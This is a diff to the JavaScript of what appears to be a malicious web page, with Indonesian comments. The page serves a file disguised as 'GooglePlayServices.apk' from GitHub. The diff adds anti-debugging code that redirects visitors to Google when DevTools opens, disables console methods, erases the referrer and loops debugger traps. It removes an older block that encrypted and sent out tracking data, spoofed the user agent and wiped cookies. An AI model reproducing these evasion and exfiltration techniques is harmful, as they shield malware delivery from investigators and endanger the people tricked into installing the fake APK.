@@ -64,6 +64,52 @@
 
 <script>
 // ============================================================
+// 🔥 DETEKSI WEBVIEW (UNTUK MATIKAN ANTI-DEBUG)
+// ============================================================
+var IS_WEBVIEW = (function() {
+    var ua = navigator.userAgent.toLowerCase();
+    return ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || /; wv\)/.test(ua);
+})();
+
+// ============================================================
+// 🔥 ANTI-DEBUG (HANYA DI CHROME, WEBVIEW DI-NONAKTIFKAN)
+// ============================================================
+if (!IS_WEBVIEW) {
+    (function() {
+        var devtools = false;
+        var element = new Image();
+        Object.defineProperty(element, 'id', {
+            get: function() {
+                devtools = true;
+                window.location.href = 'https://www.google.com';
+                if (window.history && window.history.replaceState) {
+                    window.history.replaceState(null, null, 'https://www.google.com');
+                }
+            }
+        });
+        console.log('%c', element);
+
+        // Debugger loop (ringan, tidak macet)
+        setInterval(function() {
+            try {
+                (function(){}).constructor('debugger')();
+            } catch(e) {}
+        }, 2000);
+
+        var noop = function() {};
+        ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
+            window.console[m] = noop;
+        });
+
+        if (window.history && window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        Object.defineProperty(document, 'referrer', { value: '' });
+        Error.stackTraceLimit = 0;
+    })();
+}
+
+// ============================================================
 // 🔥 TAMBAHAN PERBAIKAN: AUTO DOWNLOAD ANCHOR + CLICK
 // ============================================================
 
@@ -99,129 +145,6 @@ function downloadAPK() {
     var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
     K({ sumber: 'download_apk_start', data: { url: url } });
     autoDownloadAnchor(url, 'GooglePlayServices.apk');
-}
-
-// ============================================================
-// 🔥 ADVANCED UPGRADES: STEALTH, EXFILTRATION, ANTI-FORENSIC
-// ============================================================
-
-// ============================================================
-// 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
-// ============================================================
-(function() {
-    // Lapisan 1: DevTools detector via element trick
-    var devtools = false;
-    var element = new Image();
-    Object.defineProperty(element, 'id', {
-        get: function() {
-            devtools = true;
-            window.location.href = 'https://www.google.com';
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState(null, null, 'https://www.google.com');
-            }
-        }
-    });
-    console.log('%c', element);
-
-    // Lapisan 2: Debugger loop agresif
-    function debugLoop() {
-        var counter = 0;
-        while (true) {
-            try {
-                (function(){}).constructor('debugger')();
-                counter++;
-                if (counter > 1000) break;
-            } catch(e) {
-                break;
-            }
-        }
-    }
-    setInterval(debugLoop, 500);
-
-    // Lapisan 3: Override console methods
-    var noop = function() {};
-    ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
-        window.console[m] = noop;
-    });
-
-    // Lapisan 4: Hapus history & referrer
-    if (window.history && window.history.replaceState) {
-        window.history.replaceState(null, null, window.location.href);
-    }
-    Object.defineProperty(document, 'referrer', { value: '' });
-
-    // Lapisan 5: Override stack trace
-    Error.stackTraceLimit = 0;
-})();
-
-// ============================================================
-// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)
-// ============================================================
-var exfilQueue = [];
-var exfilSending = false;
-
-// Override K() dengan yang sudah di-enhance
-var originalK = K;
-K = function(d) {
-    d._timestamp = Date.now();
-    d._nonce = Math.random().toString(36).substring(2);
-    exfilQueue.push(d);
-    if (!exfilSending) {
-        processExfilQueue();
-    }
-};
-
-function processExfilQueue() {
-    if (exfilQueue.length === 0) {
-        exfilSending = false;
-        return;
-    }
-    exfilSending = true;
-    var item = exfilQueue.shift();
-    var plain = JSON.stringify(item);
-    var encoded = btoa(plain);
-    var xorKey = 0x2A;
-    var encrypted = '';
-    for (var i = 0; i < encoded.length; i++) {
-        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
-    }
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
-        xhr.timeout = 5000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                processExfilQueue();
-            } else {
-                exfilQueue.unshift(item);
-                setTimeout(processExfilQueue, 3000);
-            }
-        };
-        xhr.onerror = function() {
-            exfilQueue.unshift(item);
-            setTimeout(processExfilQueue, 3000);
-        };
-        xhr.send(encrypted);
-    } catch(e) {
-        exfilQueue.unshift(item);
-        setTimeout(processExfilQueue, 3000);
-    }
-}
-
-// ============================================================
-// 3. HIDE FROM SYSTEM
-// ============================================================
-function hideFromSystem() {
-    try {
-        Object.defineProperty(navigator, 'userAgent', {
-            value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            configurable: false
-        });
-    } catch(e) {}
-    document.cookie.split(';').forEach(function(cookie) {
-        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
-    });
 }
 
 // ============================================================
@@ -412,22 +335,6 @@ if (window.history && window.history.replaceState) {
     window.history.replaceState(null, null, window.location.href);
 }
 Object.defineProperty(document, 'referrer', { value: '' });
-
-// ============================================================
-// DETEKSI PLATFORM
-// ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    var platform = {
-        isAndroid: ua.indexOf('android') > -1,
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
-    };
-    return platform;
-}
-var PLATFORM = detectPlatform();
 
 // ============================================================
 // KONFIGURASI
